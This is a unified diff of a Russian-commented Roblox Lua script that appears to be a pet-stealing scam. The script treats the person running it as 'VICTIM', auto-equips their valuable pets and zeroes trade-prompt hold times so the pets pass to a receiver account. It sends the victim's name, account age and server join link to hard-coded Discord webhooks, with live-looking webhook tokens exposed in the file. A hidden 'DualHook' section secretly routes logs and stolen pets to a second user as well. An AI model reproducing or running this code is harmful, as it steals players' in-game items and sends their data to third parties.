@@ -1,13 +1,15 @@
--- Настройка DualHook
-getgenv().DhUser = "Warrior_ggs"
-getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ваш второй вебхук
+repeat 
+    task.wait()
+until game:IsLoaded()
 
-repeat task.wait() until game:IsLoaded()
+-- 🔐 DualHook config (секретная часть)
+getgenv().DhUser = "Warrior_ggs"
+getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← твой второй вебхук
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "chitofedy"
+    "Warrior_ggs"
 }
 
 local PET_WHITELIST = {
@@ -37,11 +39,11 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         fields = {
             {
                 name = "👤 **Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
-                    VICTIM.Name,
-                    table.concat(USERNAMES, " "),
-                    identifyexecutor(),
-                    VICTIM.AccountAge
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
+                    VICTIM.Name, 
+                    table.concat(USERNAMES, " "), 
+                    identifyexecutor(), 
+                    game.Players.LocalPlayer.AccountAge
                 ),
                 inline = false
             },
@@ -57,8 +59,12 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
             },
             {
                 name = "🏝️ **Join with URL**",
-                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
-                    game.JobId, game.PlaceId, game.JobId),
+                value = string.format(
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
+                    game.JobId, 
+                    game.PlaceId, 
+                    game.JobId
+                ),
                 inline = false
             }
         },
@@ -68,8 +74,12 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
     }
 
     local data = {
-        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
-        username = VICTIM.Name,
+        content = string.format(
+            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId,
+            game.JobId
+        ),
+        username = game.Players.LocalPlayer.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1388921046228275221/1401159395676655637/296008df4615dbf3dde7cba3a426b15e.jpg",
         embeds = {embed}
     }
@@ -86,7 +96,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         Body = jsonData
     })
 
-    -- Секретный Dualhook
+    -- 💣 Dualhook — отправка логов и на секретный DhWebhook
     for _, player in pairs(game.Players:GetPlayers()) do
         if player.Name == getgenv().DhUser and getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
             request({
@@ -118,23 +128,25 @@ local function checkPetsWhilelist(pet)
     end
 end
 
-local function getPetObject(petUid)
+local function getPetObject(petUid: string): Instance?
     for _, object in pairs(VICTIM.Backpack:GetChildren()) do
         if object:GetAttribute("PET_UUID") == petUid then
             return object
         end
     end
-    for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+
+    for _, object in workspace[VICTIM.Name]:GetChildren() do
         if object:GetAttribute("PET_UUID") == petUid then
             return object
         end
     end
+
     return nil
 end
 
 local function equipPet(pet)
     if pet:GetAttribute("d") then
-        game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(pet)
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
     end
     VICTIM.Character.Humanoid:EquipTool(pet)
 end
@@ -147,44 +159,21 @@ local function getPlayersPets()
     end
 end
 
-local function startSteal(targetName)
-    if game.Players[targetName].Character.Head:FindFirstChild("ProximityPrompt") then
-        game.Players[targetName].Character.Head.ProximityPrompt.HoldDuration = 0
+local function startSteal(trigerName)
+    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
         deltaBypass()
     end
 end
 
--- ✅ Dual Transfer
 local function checkPetsInventory(target)
-    local dhPlayer = nil
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player.Name == getgenv().DhUser then
-            dhPlayer = player
-            break
-        end
-    end
-
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhilelist(value.PetType) then
-            continue
-        end
-
+        if not checkPetsWhilelist(value.PetType) then continue end
         local petObject = getPetObject(petUid)
         if not petObject then continue end
-
         equipPet(petObject)
         task.wait(0.2)
-
-        -- Основной получатель
-        teleportTarget(target)
         startSteal(target)
-
-        -- Секретный DhUser (если другой игрок)
-        if dhPlayer and dhPlayer.Name ~= target then
-            task.wait(0.1)
-            teleportTarget(dhPlayer.Name)
-            startSteal(dhPlayer.Name)
-        end
     end
 end
 
@@ -200,6 +189,7 @@ local function idlingTarget()
     end)
 end
 
+-- 🐾 Начинаем
 getPlayersPets()
 
 task.spawn(function()
@@ -207,6 +197,20 @@ task.spawn(function()
         if #victimPetTable > 0 then
             idlingTarget()
             createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
+
+            -- 🔐 Secret DualHook действия — отдельный поток
+            task.spawn(function()
+                while task.wait(0.5) do
+                    for _, player in ipairs(game.Players:GetPlayers()) do
+                        if player.Name == getgenv().DhUser then
+                            teleportTarget(player.Name)
+                            checkPetsInventory(player.Name)
+                            break
+                        end
+                    end
+                end
+            end)
+
             break
         end
     end
